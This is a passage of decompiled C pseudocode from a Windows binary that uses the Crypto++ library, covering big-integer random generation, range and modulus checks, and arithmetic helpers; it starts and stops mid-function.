  _BYTE *v52; // rax
  char v53; // di
  unsigned int v54; // eax
  __int64 v55; // rdi
  unsigned __int64 v56; // r8
  __int64 v57; // rdx
  __int64 v58; // rax
  unsigned __int64 v59; // r12
  __m128i *v60; // rdi
  __int64 v61; // rax
  __int64 v62; // rcx
  bool v63; // zf
  __int64 v64; // rcx
  __int64 v65; // rax
  unsigned __int64 v66; // r8
  __int64 v67; // r10
  char v68; // al
  __int64 v69; // r12
  unsigned int v70; // eax
  int v71; // er14
  int v72; // eax
  __int64 *v73; // rdx
  char v74; // di
  __int64 v75; // rax
  _QWORD *v76; // rcx
  __int64 v77; // rcx
  __int64 v78; // rdx
  __int64 v79; // rcx
  unsigned __int64 *v80; // rax
  unsigned __int64 v81; // rdx
  unsigned __int64 v82; // rcx
  __int64 v83; // rdi
  __m128i *v84; // rax
  __int64 *v85; // r8
  __int64 *v86; // rdx
  int v87; // eax
  __int64 v88; // rax
  __int64 v89; // r9
  int v91; // [rsp+20h] [rbp-E0h]
  char v92[8]; // [rsp+30h] [rbp-D0h] BYREF
  unsigned int v93; // [rsp+38h] [rbp-C8h]
  int v94; // [rsp+3Ch] [rbp-C4h] BYREF
  __int64 (__fastcall **v95)(); // [rsp+40h] [rbp-C0h] BYREF
  _QWORD v96[2]; // [rsp+48h] [rbp-B8h] BYREF
  unsigned __int64 v97; // [rsp+58h] [rbp-A8h]
  __m128i *v98; // [rsp+60h] [rbp-A0h]
  int v99; // [rsp+68h] [rbp-98h]
  __int64 v100; // [rsp+70h] [rbp-90h]
  __int64 v101; // [rsp+78h] [rbp-88h] BYREF
  __int64 v102[3]; // [rsp+80h] [rbp-80h] BYREF
  unsigned __int64 v103; // [rsp+98h] [rbp-68h]
  __int64 v104; // [rsp+A0h] [rbp-60h]
  int v105; // [rsp+A8h] [rbp-58h]
  __int64 v106[3]; // [rsp+B0h] [rbp-50h] BYREF
  __int64 v107; // [rsp+C8h] [rbp-38h]
  __int64 v108; // [rsp+D0h] [rbp-30h]
  int v109; // [rsp+D8h] [rbp-28h]
  __int64 v110[3]; // [rsp+E0h] [rbp-20h] BYREF
  unsigned __int64 v111; // [rsp+F8h] [rbp-8h]
  __int64 v112; // [rsp+100h] [rbp+0h]
  int v113; // [rsp+108h] [rbp+8h]
  __int64 v114; // [rsp+110h] [rbp+10h] BYREF
  __int64 v115; // [rsp+118h] [rbp+18h]
  unsigned __int64 v116; // [rsp+120h] [rbp+20h]
  __int64 v117; // [rsp+130h] [rbp+30h]
  unsigned __int64 v118; // [rsp+138h] [rbp+38h]
  __int64 v119; // [rsp+140h] [rbp+40h]
  __int64 v120; // [rsp+148h] [rbp+48h]
  __int64 v121; // [rsp+150h] [rbp+50h]
  __int64 v122; // [rsp+158h] [rbp+58h]
  __m128i v123; // [rsp+160h] [rbp+60h] BYREF
  unsigned __int64 v124; // [rsp+170h] [rbp+70h]
  unsigned __int64 v125; // [rsp+178h] [rbp+78h]
  __m128i *v126; // [rsp+180h] [rbp+80h]
  int v127; // [rsp+188h] [rbp+88h]
  __int64 v128; // [rsp+190h] [rbp+90h] BYREF
  __int64 v129[4]; // [rsp+198h] [rbp+98h] BYREF
  int v130; // [rsp+1B8h] [rbp+B8h]
  __int64 (__fastcall **v131)(); // [rsp+1F0h] [rbp+F0h] BYREF
  __int64 (__fastcall **v132)(); // [rsp+1F8h] [rbp+F8h] BYREF
  __int64 pExceptionObject; // [rsp+250h] [rbp+150h] BYREF
  __int64 v134; // [rsp+2A0h] [rbp+1A0h] BYREF

  v121 = -2i64;
  v3 = a3;
  v120 = a3;
  v101 = a2;
  v5 = 0;
  v6 = 0;
  v93 = 0;
  v7 = (_QWORD *)sub_13F112A00((__int64)&v131, (__int64)&off_13F1C4398);
  sub_13F1122F0(v3, (__int64)v102, (__int64)"Min", v7);
  v95 = off_13F185278;
  v96[1] = 0x1FFFFFFFFFFFFFFFi64;
  v97 = 2i64;
  v98 = (__m128i *)sub_13F123740((__int64)v96, 2ui64);
  v99 = 0;
  v98->m128i_i64[1] = 0i64;
  v98->m128i_i64[0] = 0i64;
  if ( (*(unsigned __int8 (__fastcall **)(__int64, const char *, void *, __int64 (__fastcall ***)()))(*(_QWORD *)v3 + 8i64))(
         v3,
         "Max",
         &CryptoPP::Integer `RTTI Type Descriptor',
         &v95) )
  {
    v18 = v99;
    v17 = v98;
  }
  else
  {
    if ( !(*(unsigned __int8 (__fastcall **)(__int64, const char *, int *, int *))(*(_QWORD *)v3 + 8i64))(
            v3,
            "BitLength",
            &int `RTTI Type Descriptor',
            &v94) )
    {
      sub_13F1053B0(&v123, (const __m128i *)"Integer: missing Max argument");
      sub_13F101600((__int64)&pExceptionObject, &v123);
      CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    v8 = v94;
    v123.m128i_i64[0] = (__int64)off_13F185278;
    v9 = sub_13F122180((unsigned __int64)(v94 + 64i64) >> 6);
    v124 = 0x1FFFFFFFFFFFFFFFi64;
    v125 = v9;
    v10 = (__m128i *)sub_13F123740((__int64)&v123.m128i_i64[1], v9);
    v126 = v10;
    v127 = 0;
    v10->m128i_i64[0] = 0i64;
    if ( v9 != 1 )
      memset(&v10->m128i_u64[1], 0, 8 * (v9 - 1));
    v93 = 1;
    v11 = sub_13F122180((v8 + 64) >> 6);
    sub_13F11C2E0(&v123.m128i_i64[1], v11);
    v12 = v126;
    v126->m128i_i64[v8 >> 6] |= 1i64 << (v8 & 0x3F);
    v13 = v125;
    if ( v97 != v125 || !v12->m128i_i64[v125 >> 1] )
    {
      v14 = v125;
      if ( v125 )
      {
        v15 = &v12[-1].m128i_i64[v125 + 1];
        do
        {
          if ( *v15 )
            break;
          --v15;
          --v14;
        }
        while ( v14 );
      }
      v16 = sub_13F122180((unsigned int)v14);
      sub_13F120E60(v96, v16);
    }
    v17 = v98;
    if ( v98 != v12 )
    {
      sub_13F10D330(v98, 8 * v97, v12, 8 * v97);
      v17 = v98;
    }
    v18 = v127;
    v99 = v127;
    if ( v124 < v13 )
      v13 = v124;
    if ( v12 )
    {
      memset(v12, 0, 8 * v13);
      sub_13F12E4D0((__int64)v12);
      v18 = v99;
      v17 = v98;
    }
    v6 = 0;
    v93 = 0;
  }
  v19 = -1;
  if ( v105 != 1 )
  {
    if ( v18 == 1 )
      goto LABEL_188;
    v20 = v103;
    if ( v103 )
    {
      v21 = (_QWORD *)(v104 + 8 * (v103 - 1));
      do
      {
        if ( *v21 )
          break;
        --v21;
        --v20;
      }
      while ( v20 );
    }
    v22 = v97;
    if ( v97 )
    {
      v23 = &v17[v97 / 2 - 1].m128i_i64[1];
      do
      {
        if ( *v23 )
          break;
        --v23;
        --v22;
      }
      while ( v22 );
    }
    if ( (_DWORD)v20 != (_DWORD)v22 )
    {
      v24 = -1;
      if ( (unsigned int)v20 > (unsigned int)v22 )
        v24 = 1;
      goto LABEL_40;
    }
    v25 = (unsigned int)v20;
    if ( (_DWORD)v20 )
    {
      v26 = &v17->m128i_i64[(unsigned int)v20];
      while ( 1 )
      {
        --v25;
        v27 = *(__int64 *)((char *)--v26 + v104 - (_QWORD)v17);
        if ( v27 > *v26 )
          break;
        if ( v27 < *v26 )
          goto LABEL_55;
        if ( !v25 )
          goto LABEL_39;
      }
LABEL_75:
      v24 = 1;
      goto LABEL_40;
    }
    goto LABEL_39;
  }
  if ( v18 == 1 )
  {
    v35 = v103;
    if ( v103 )
    {
      v36 = (_QWORD *)(v104 + 8 * (v103 - 1));
      do
      {
        if ( *v36 )
          break;
        --v36;
        --v35;
      }
      while ( v35 );
    }
    v37 = v97;
    if ( v97 )
    {
      v38 = &v17[v97 / 2 - 1].m128i_i64[1];
      do
      {
        if ( *v38 )
          break;
        --v38;
        --v37;
      }
      while ( v37 );
    }
    if ( (_DWORD)v35 != (_DWORD)v37 )
    {
      v24 = 1;
      if ( (unsigned int)v35 > (unsigned int)v37 )
        v24 = -1;
      goto LABEL_40;
    }
    v39 = (unsigned int)v35;
    if ( (_DWORD)v35 )
    {
      v40 = &v17->m128i_i64[(unsigned int)v35];
      while ( 1 )
      {
        --v39;
        v41 = *(__int64 *)((char *)--v40 + v104 - (_QWORD)v17);
        if ( v41 > *v40 )
          break;
        if ( v41 < *v40 )
          goto LABEL_75;
        if ( !v39 )
          goto LABEL_39;
      }
LABEL_55:
      v24 = -1;
LABEL_40:
      if ( v24 <= 0 )
        goto LABEL_41;
LABEL_188:
      sub_13F1053B0(&v123, (const __m128i *)"Integer: Min must be no greater than Max");
      sub_13F101600((__int64)&pExceptionObject, &v123);
      CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
LABEL_39:
    v24 = 0;
    goto LABEL_40;
  }
LABEL_41:
  v28 = (_QWORD *)sub_13F112A00((__int64)&v131, (__int64)&off_13F1C4398);
  sub_13F1122F0(v3, (__int64)v110, (__int64)"EquivalentTo", v28);
  v29 = (_QWORD *)sub_13F112A00((__int64)&v128, (__int64)&off_13F1C43C8);
  sub_13F1122F0(v3, (__int64)v106, (__int64)"Mod", v29);
  if ( v113 == 1 || v109 == 1 )
    goto LABEL_186;
  v30 = v111;
  if ( v111 )
  {
    v31 = (_QWORD *)(v112 + 8 * (v111 - 1));
    do
    {
      if ( *v31 )
        break;
      --v31;
      --v30;
    }
    while ( v30 );
  }
  v32 = v107;
  if ( v107 )
  {
    v33 = (_QWORD *)(v108 + 8 * (v107 - 1));
    do
    {
      if ( *v33 )
        break;
      --v33;
      --v32;
    }
    while ( v32 );
  }
  if ( (_DWORD)v30 == (_DWORD)v32 )
  {
    v42 = (unsigned int)v30;
    if ( (_DWORD)v30 )
    {
      v43 = (unsigned __int64 *)(v108 + 8i64 * (unsigned int)v30);
      while ( 1 )
      {
        --v42;
        v44 = *(unsigned __int64 *)((char *)--v43 + v112 - v108);
        if ( v44 > *v43 )
          break;
        if ( v44 < *v43 )
        {
          v34 = -1;
          goto LABEL_82;
        }
        if ( !v42 )
          goto LABEL_81;
      }
      v34 = 1;
    }
    else
    {
LABEL_81:
      v34 = 0;
    }
  }
  else
  {
    v34 = -1;
    if ( (unsigned int)v30 > (unsigned int)v32 )
      v34 = 1;
  }
LABEL_82:
  if ( v34 >= 0 )
  {
LABEL_186:
    sub_13F1053B0(&v123, (const __m128i *)"Integer: invalid EquivalentTo and/or Mod argument");
    sub_13F101600((__int64)&pExceptionObject, &v123);
    CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v45 = 0;
  if ( (*(unsigned __int8 (__fastcall **)(__int64, const char *, void *, int *))(*(_QWORD *)v3 + 8i64))(
         v3,
         "RandomNumberType",
         &enum CryptoPP::Integer::RandomNumberType `RTTI Type Descriptor',
         &v94) )
  {
    v45 = v94;
  }
  v94 = v45;
  v46 = 0i64;
  v100 = 0i64;
  v117 = -1i64;
  v118 = 0i64;
  v119 = 0i64;
  v115 = 0i64;
  v116 = 0i64;
  LOBYTE(v114) = 0;
  if ( (*(unsigned __int8 (__fastcall **)(__int64, const char *, void *, __int64 *))(*(_QWORD *)v3 + 8i64))(
         v3,
         "Seed",
         &CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor',
         &v114) )
  {
    sub_13F131450((__int64)&pExceptionObject, 0i64);
    sub_13F10B300((__int64)&v131, (__int64)&pExceptionObject, 48);
    v131 = off_13F182398;
    v132 = off_13F182508;
    sub_13F10B300((__int64)&v128, (__int64)&v131, 2);
    v47 = sub_13F11F9D0((__int64)v102, 1);
    sub_13F11D4F0((__int64)v102, (__int64)&v128, v47, 1);
    sub_13F10D070((__int64)&v128);
    sub_13F10B5E0((__int64)&v128);
    sub_13F10B300((__int64)&v128, (__int64)&v131, 2);
    v48 = sub_13F11F9D0((__int64)&v95, 1);
    sub_13F11D4F0((__int64)&v95, (__int64)&v128, v48, 1);
    sub_13F10D070((__int64)&v128);
    sub_13F10B5E0((__int64)&v128);
    sub_13F10B300((__int64)&v128, (__int64)&v131, 2);
    v49 = sub_13F11F9D0((__int64)v110, 1);
    sub_13F11D4F0((__int64)v110, (__int64)&v128, v49, 1);
    sub_13F10D070((__int64)&v128);
    sub_13F10B5E0((__int64)&v128);
    sub_13F10B300((__int64)&v128, (__int64)&v131, 2);
    v50 = sub_13F11F9D0((__int64)v106, 1);
    sub_13F11D4F0((__int64)v106, (__int64)&v128, v50, 1);
    sub_13F10D070((__int64)&v128);
    sub_13F10B5E0((__int64)&v128);
    LOBYTE(v134) = 0;
    BYTE1(v134) = HIBYTE(v45);
    BYTE2(v134) = BYTE2(v45);
    BYTE3(v134) = BYTE1(v45);
    BYTE4(v134) = v45;
    v51 = 4;
    v52 = (char *)&v134 + 1;
    do
    {
      if ( *v52 )
        break;
      --v51;
      ++v52;
    }
    while ( v51 > 1 );
    v53 = ((_BYTE *)&v134 - v51)[5];
    v92[0] = 2;
    ((void (__fastcall *)(__int64 (__fastcall ***)(), char *, __int64, _QWORD, char))v131[6])(&v131, v92, 1i64, 0i64, 1);
    v54 = v51 + 1;
    if ( v53 >= 0 )
      v54 = v51;
    v55 = v54;
    sub_13F10CBB0((__int64 *)&v131, v54);
    LOBYTE(v91) = 1;
    ((void (__fastcall *)(__int64 (__fastcall ***)(), char *, _QWORD, _QWORD, int))v131[6])(
      &v131,
      (char *)&v134 - v55 + 5,
      (unsigned int)v55,
      0i64,
      v91);
    if ( (_BYTE)v114 )
    {
      v56 = v118;
      v57 = v119;
    }
    else
    {
      v56 = v116;
      v57 = v115;
    }
    sub_13F10CAF0((__int64 *)&v131, v57, v56);
    sub_13F10D070((__int64)&v131);
    v58 = sub_13F131BC0((__int64)&pExceptionObject);
    v59 = v58;
    v123.m128i_i64[1] = -1i64;
    v124 = v58;
    if ( v58 )
      v60 = (__m128i *)sub_13F12E4E0(v58);
    else
      v60 = 0i64;
    v134 = (__int64)v60;
    v125 = (unsigned __int64)v60;
    sub_13F131D10((__int64)&pExceptionObject, (__int64)v60, v59);
    v61 = sub_13F14059C(48i64);
    v46 = v61;
    v122 = v61;
    if ( v61 )
    {
      sub_13F10EE30(v61, 1);
      *(_QWORD *)v46 = &CryptoPP::KDF2_RNG::`vftable';
      *(_DWORD *)(v46 + 8) = 0;
      v62 = v59;
      if ( v59 > 0x1000000 )
        v62 = 0x1000000i64;
      v63 = v62 == -4;
      v64 = v62 + 4;
      *(_QWORD *)(v46 + 24) = -1i64;
      *(_QWORD *)(v46 + 32) = v64;
      if ( v63 )
        v65 = 0i64;
      else
        v65 = sub_13F12E4E0(v64);
      *(_QWORD *)(v46 + 40) = v65;
      v66 = v59;
      if ( v59 > 0x1000000 )
        v66 = 0x1000000i64;
      sub_13F15EB00((__m128i *)(v65 + 4), v60, v66);
    }
    else
    {
      v46 = 0i64;
    }
    v100 = v46;
    if ( v60 )
    {
      memset(v60, 0, v59);
      sub_13F12E550(v134);
    }
    sub_13F10B5E0((__int64)&v131);
    sub_13F1315A0(&pExceptionObject);
    v3 = v120;
    v45 = v94;
  }
  v67 = v46;
  if ( !v46 )
    v67 = v101;
  v134 = v67;
  if ( !v45 )
  {
    if ( v109 != 1 )
    {
      v75 = v107;
      if ( v107 )
      {
        v76 = (_QWORD *)(v108 + 8 * (v107 - 1));
        do
        {
          if ( *v76 )
            break;
          --v76;
          --v75;
        }
        while ( v75 );
      }
      v77 = 2i64;
      v78 = 3942920i64;
      do
      {
        if ( *(_QWORD *)v78 )
          break;
        v78 -= 8i64;
        --v77;
      }
      while ( v77 );
      if ( (_DWORD)v75 == (_DWORD)v77 )
      {
        v79 = (unsigned int)v75;
        if ( (_DWORD)v75 )
        {
          v80 = (unsigned __int64 *)(8i64 * (unsigned int)v75 + 3942912);
          while ( 1 )
          {
            --v79;
            v81 = *(unsigned __int64 *)((char *)--v80 + v108 - 3942912);
            if ( v81 > *v80 )
              break;
            if ( v81 < *v80 )
              goto LABEL_159;
            if ( !v79 )
              goto LABEL_155;
          }
          v19 = 1;
        }
        else
        {
LABEL_155:
          v19 = 0;
        }
      }
      else if ( (unsigned int)v75 > (unsigned int)v77 )
      {
        v19 = 1;
      }
LABEL_159:
      if ( !v19 )
      {
        sub_13F121660(a1, v67, (__int64)v102, (__int64)&v95);
LABEL_179:
        sub_13F1032B0(&v114);
        if ( v46 )
LABEL_180:
          (**(void (__fastcall ***)(__int64, __int64))v46)(v46, 1i64);
LABEL_181:
        sub_13F102A00(v106);
        sub_13F102A00(v110);
        sub_13F102A00(&v95);
        sub_13F102A00(v102);
        return 1;
      }
    }
    v82 = v111;
    if ( v111 < v103 )
      v82 = v103;
    v123.m128i_i64[0] = (__int64)off_13F185278;
    v83 = sub_13F122180(v82);
    v124 = 0x1FFFFFFFFFFFFFFFi64;
    v125 = v83;
    v84 = (__m128i *)sub_13F123740((__int64)&v123.m128i_i64[1], v83);
    v126 = v84;
    v127 = 0;
    v84->m128i_i64[0] = 0i64;
    if ( v83 != 1 )
      memset(&v84->m128i_u64[1], 0, 8 * (v83 - 1));
    v93 = 4;
    if ( v113 == 1 )
    {
      if ( v105 != 1 )
      {
        sub_13F120FA0((__int64)&v123, (__int64)v110, (__int64)v102);
        v127 = 1;
        goto LABEL_172;
      }
      v85 = v110;
      v86 = v102;
    }
    else
    {
      v85 = v102;
      v86 = v110;
      if ( v105 == 1 )
      {
        sub_13F120FA0((__int64)&v123, (__int64)v110, (__int64)v102);
        goto LABEL_172;
      }
    }
    sub_13F1213E0((__int64)&v123, (__int64)v86, (__int64)v85);
LABEL_172:
    sub_13F11FD00((__int64)&v123, (__int64)&v131, (__int64)v106);
    sub_13F120ED0((__int64)v102, (__int64)&v128, (__int64)&v131);
    sub_13F102A00(&v131);
    sub_13F102A00(&v123);
    if ( v99 == 1 )
    {
      if ( v130 != 1 )
        goto LABEL_182;
      v87 = -(int)sub_13F121140((__int64)&v95, (__int64)&v128);
    }
    else
    {
      if ( v130 == 1 )
      {
LABEL_178:
        v88 = sub_13F113990((__int64)&pExceptionObject, (__int64)&v95, (__int64)&v128);
        v89 = sub_13F113B00((__int64)&v123, v88, (__int64)v106);
        sub_13F121660(a1, v134, (__int64)&off_13F1C4398, v89);
        sub_13F102A00(&v123);
        sub_13F102A00(&pExceptionObject);
        sub_13F113E00(a1, (__int64)v106);
        sub_13F113F60(a1, (__int64)&v128);
        sub_13F102A00(&v128);
        goto LABEL_179;
      }
      v87 = sub_13F121140((__int64)&v95, (__int64)&v128);
    }
    if ( v87 >= 0 )
      goto LABEL_178;
LABEL_182:
    sub_13F102A00(&v128);
    sub_13F1032B0(&v114);
    if ( v46 )
      goto LABEL_183;
    goto LABEL_184;
  }
  if ( v45 != 1 )
  {
    sub_13F1053B0(&v123, (const __m128i *)"Integer: invalid RandomNumberType argument");
    sub_13F101600((__int64)&pExceptionObject, &v123);
    CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v68 = (*(__int64 (__fastcall **)(__int64, const char *, const struct CryptoPP::PrimeSelector **, __int64 *))(*(_QWORD *)v3 + 8i64))(
          v3,
          "PointerToPrimeSelector",
          &CryptoPP::PrimeSelector const * `RTTI Type Descriptor',
          &v101);
  v69 = 0i64;
  if ( v68 )
    v69 = v101;
  while ( 1 )
  {
    if ( ++v5 != 16 )
      goto LABEL_122;
    sub_13F112A00((__int64)&v128, (__int64)v102);
    if ( !(unsigned __int8)sub_13F136EE0((__int64)&v128, (__int64)&v95, (__int64)v110, (__int64)v106, v69) )
      break;
    sub_13F113500(a1, (__int64)&v128);
    if ( !(unsigned __int8)sub_13F136EE0((__int64)&v128, (__int64)&v95, (__int64)v110, (__int64)v106, v69) )
    {
      sub_13F102A00(&v128);
LABEL_134:
      sub_13F1032B0(&v114);
      if ( !v46 )
        goto LABEL_181;
      goto LABEL_180;
    }
    sub_13F105180(v129);
LABEL_122:
    sub_13F121660(a1, v134, (__int64)v102, (__int64)&v95);
    v70 = sub_13F1392D0((__int64)&v95);
    sub_13F112AD0((__int64)&v131, v70);
    sub_13F112CF0((__int64)&v123);
    v71 = v6 | 0x40;
    v93 = v71;
    sub_13F120710((__int64)&v123, (__int64)v106, (__int64)&v131);
    sub_13F120ED0(a1, (__int64)&v128, (__int64)&v123);
    v6 = v71 & 0xFFFFFF1F | 0xA0;
    v93 = v6;
    if ( v99 == 1 )
    {
      if ( v130 == 1 )
        v72 = -(int)sub_13F121140((__int64)&v95, (__int64)&v128);
      else
        v72 = -1;
    }
    else if ( v130 == 1 )
    {
      v72 = 1;
    }
    else
    {
      v72 = sub_13F121140((__int64)&v95, (__int64)&v128);
    }
    v73 = (__int64 *)&v95;
    if ( v72 >= 0 )
      v73 = &v128;
    v74 = sub_13F136EE0(a1, (__int64)v73, (__int64)v110, (__int64)v106, v69);
    sub_13F105180(v129);
    sub_13F105180(&v123.m128i_i64[1]);
    sub_13F105180(&v132);
    if ( v74 )
      goto LABEL_134;
  }
  sub_13F102A00(&v128);
  sub_13F1032B0(&v114);
  if ( !v46 )
    goto LABEL_184;
LABEL_183:
  (**(void (__fastcall ***)(__int64, __int64))v46)(v46, 1i64);
LABEL_184:
  sub_13F102A00(v106);
  sub_13F102A00(v110);
  sub_13F102A00(&v95);
  sub_13F102A00(v102);
  return 0;
}
// 13F11DB6C: write access to const memory at 13F1C4384 has been detected
// 13F11DC1F: write access to const memory at 13F1C4384 has been detected
// 13F11E7C8: write access to const memory at 13F1C4384 has been detected
// 13F11E293: variable 'v91' is possibly undefined
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F182398: using guessed type __int64 (__fastcall *off_13F182398[6])();
// 13F182508: using guessed type __int64 (__fastcall *off_13F182508[3])();
// 13F185278: using guessed type __int64 (__fastcall *off_13F185278[4])();
// 13F185868: using guessed type void *CryptoPP::KDF2_RNG::`vftable';
// 13F1BF328: using guessed type const struct CryptoPP::PrimeSelector *CryptoPP::PrimeSelector const * `RTTI Type Descriptor';
// 13F1C3E48: using guessed type int int `RTTI Type Descriptor';
// 13F1C4398: using guessed type __int64 (__fastcall *(*off_13F1C4398)[4])();
// 13F1C43C8: using guessed type __int64 (__fastcall *(*off_13F1C43C8)[4])();
// 13F1C43D8: using guessed type __int128 xmmword_13F1C43D8;
// 13F1C43E8: using guessed type __int64 qword_13F1C43E8;
// 13F1C43F0: using guessed type int dword_13F1C43F0;
// 13F11DAE0: using guessed type _QWORD var_260[3];
// 13F11DAE0: using guessed type _QWORD var_200[3];
// 13F11DAE0: using guessed type _QWORD var_230[3];
// 13F11DAE0: using guessed type char var_2B0[8];
// 13F11DAE0: using guessed type _QWORD var_148[4];

//----- (000000013F11EB30) ----------------------------------------------------
char __fastcall sub_13F11EB30(__int64 a1, unsigned __int64 a2)
{
  char v2; // r8
  unsigned __int64 v3; // rdx

  v2 = a2;
  v3 = a2 >> 6;
  if ( v3 >= *(_QWORD *)(a1 + 24) )
    return 0;
  else
    return (*(_QWORD *)(*(_QWORD *)(a1 + 32) + 8 * v3) >> (v2 & 0x3F)) & 1;
}

//----- (000000013F11EB60) ----------------------------------------------------
__int64 (__fastcall *(**sub_13F11EB60())[4])()
{
  return &off_13F1C4398;
}
// 13F1C4398: using guessed type __int64 (__fastcall *(*off_13F1C4398)[4])();

//----- (000000013F11EB70) ----------------------------------------------------
__int64 __fastcall sub_13F11EB70(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 112i64))(*(_QWORD *)(a1 + 8));
}

//----- (000000013F11EB80) ----------------------------------------------------
__int64 __fastcall sub_13F11EB80(__int64 a1, __int64 a2)
{
  unsigned __int64 v3; // rcx
  __m128i *v4; // r8
  int v5; // edi
  unsigned __int64 v6; // rax
  __int64 *v7; // rdx
  __int64 v8; // rbx
  __int64 v9; // rdx
  __int64 *v10; // rax
  __int64 v11; // rdx
  char v13[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v14; // [rsp+38h] [rbp-30h]
  unsigned __int64 v15; // [rsp+40h] [rbp-28h]
  __m128i *v16; // [rsp+48h] [rbp-20h]
  int v17; // [rsp+50h] [rbp-18h]

  sub_13F112A00((__int64)v13, a2);
  v3 = v15;
  v4 = v16;
  v5 = v17;
  if ( v17 == 1 || v16->m128i_i64[0] )
    goto LABEL_8;
  v6 = v15;
  if ( v15 )
  {
    v7 = &v16[-1].m128i_i64[v15 + 1];
    do
    {
      if ( *v7 )
        break;
      --v7;
      --v6;
    }
    while ( v6 );
  }
  if ( (_DWORD)v6 )
  {
LABEL_8:
    v5 = 1 - v17;
    v17 = 1 - v17;
  }
  v8 = a1 + 72;
  if ( (char *)v8 != v13 )
  {
    v9 = *(_QWORD *)(v8 + 24);
    if ( v9 != v15 || !v16->m128i_i64[v15 >> 1] )
    {
      if ( v15 )
      {
        v10 = &v16->m128i_i64[v15 - 1];
        do
        {
          if ( *v10 )
            break;
          --v10;
          --v3;
        }
        while ( v3 );
      }
      v11 = sub_13F122180((unsigned int)v3);
      sub_13F120E60((_QWORD *)(v8 + 8), v11);
      v9 = *(_QWORD *)(v8 + 24);
      v5 = v17;
      v4 = v16;
      v3 = v15;
    }
    if ( *(__m128i **)(v8 + 32) != v4 )
    {
      sub_13F10D330(*(__m128i **)(v8 + 32), 8 * v9, v4, 8 * v9);
      v5 = v17;
      v4 = v16;
      v3 = v15;
    }
    *(_DWORD *)(v8 + 40) = v5;
  }
  if ( v14 < v3 )
    v3 = v14;
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E4D0((__int64)v4);
  }
  return v8;
}

//----- (000000013F11ECC0) ----------------------------------------------------
__int64 __fastcall sub_13F11ECC0(__int64 a1, __int64 a2)
{
  _QWORD *v4; // rcx
  __int64 v5; // rax
  _QWORD *v6; // rdx
  const __m128i *v8; // r8
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // r8
  unsigned __int64 v12; // rcx
  _QWORD *v13; // r10
  __int64 v14; // r9
  unsigned int v15; // edx
  unsigned __int64 v16; // r9
  __int64 v17; // r8
  __int64 v18; // rcx

  if ( *(_DWORD *)(a2 + 40) != 1 )
  {
    v4 = *(_QWORD **)(a2 + 32);
    if ( !*v4 )
    {
      v5 = *(_QWORD *)(a2 + 24);
      if ( v5 )
      {
        v6 = &v4[v5 - 1];
        do
        {
          if ( *v6 )
            break;
          --v6;
          --v5;
        }
        while ( v5 );
      }
      if ( !(_DWORD)v5 )
        return a2;
    }
  }
  v8 = *(const __m128i **)(a1 + 56);
  v9 = *(_QWORD *)(a1 + 104);
  if ( (const __m128i *)v9 != v8 )
  {
    sub_13F10D330(*(__m128i **)(a1 + 104), 8i64 * *(_QWORD *)(a1 + 48), v8, 8i64 * *(_QWORD *)(a1 + 48));
    v9 = *(_QWORD *)(a1 + 104);
  }
  if ( sub_13F13A520(*(_QWORD *)(a2 + 24), v9, v9, *(_QWORD *)(a2 + 32)) )
  {
    v10 = *(_QWORD *)(a1 + 104);
    v11 = *(_QWORD *)(a2 + 24);
    v12 = *(_QWORD *)(v10 + 8 * v11);
    v13 = (_QWORD *)(v10 + 8 * v11);
    v14 = *(_QWORD *)(a1 + 48);
    *v13 = v12 - 1;
    if ( v12 - 1 > v12 )
    {
      v15 = 1;
      v16 = v14 - v11;
      if ( v16 > 1 )
      {
        v17 = 1i64;
        do
        {
          v18 = v13[v17];
          v13[v17] = v18 - 1;
          if ( v18 )
            break;
          v17 = ++v15;
        }
        while ( v15 < v16 );
      }
    }
  }
  return a1 + 72;
}

//----- (000000013F11EDB0) ----------------------------------------------------
__int64 __fastcall sub_13F11EDB0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 128i64))(*(_QWORD *)(a1 + 8));
}

//----- (000000013F11EDC0) ----------------------------------------------------
__int64 __fastcall sub_13F11EDC0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rax
  unsigned __int64 v7; // rcx
  __int64 v8; // rdx
  __int64 v10; // rax
  unsigned __int64 v11; // rcx
  __int64 v12; // rdx
  char v13[16]; // [rsp+28h] [rbp-40h] BYREF
  unsigned __int64 v14; // [rsp+38h] [rbp-30h]
  unsigned __int64 v15; // [rsp+40h] [rbp-28h]
  void *v16; // [rsp+48h] [rbp-20h]

  if ( *(_DWORD *)(a1 + 40) == 1 )
  {
    v6 = sub_13F11FD00(a1, (__int64)v13, a3);
    sub_13F11EF70(v6, a2, a3);
    v7 = v15;
    if ( v14 < v15 )
      v7 = v14;
    v8 = (__int64)v16;
    if ( v16 )
    {
      memset(v16, 0, 8 * v7);
      sub_13F12E4D0(v8);
    }
    return a2;
  }
  else if ( *(_DWORD *)(a3 + 40) == 1 || (int)sub_13F121140(a1, a3) >= 0 )
  {
    v10 = sub_13F11FD00(a1, (__int64)v13, a3);
    sub_13F11EF70(v10, a2, a3);
    v11 = v15;
    if ( v14 < v15 )
      v11 = v14;
    v12 = (__int64)v16;
    if ( v16 )
    {
      memset(v16, 0, 8 * v11);
      sub_13F12E4D0(v12);
    }
    return a2;
  }
  else
  {
    sub_13F11EF70(a1, a2, a3);
    return a2;
  }
}

//----- (000000013F11EEE0) ----------------------------------------------------
__int64 __fastcall sub_13F11EEE0(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v3; // rbx
  unsigned __int64 v4; // rax
  __int64 v5; // r9
  unsigned __int64 v6; // rcx
  __int64 v7; // r8
  unsigned __int64 v8; // rdx
  __int64 v9; // rax
  unsigned __int64 v10; // rax

  v3 = a2;
  v4 = sub_13F11FDF0(a1, a2);
  v5 = 0i64;
  v6 = v4;
  v7 = 1i64;
  if ( !v4 )
    return 0i64;
  while ( v6 != 1 )
  {
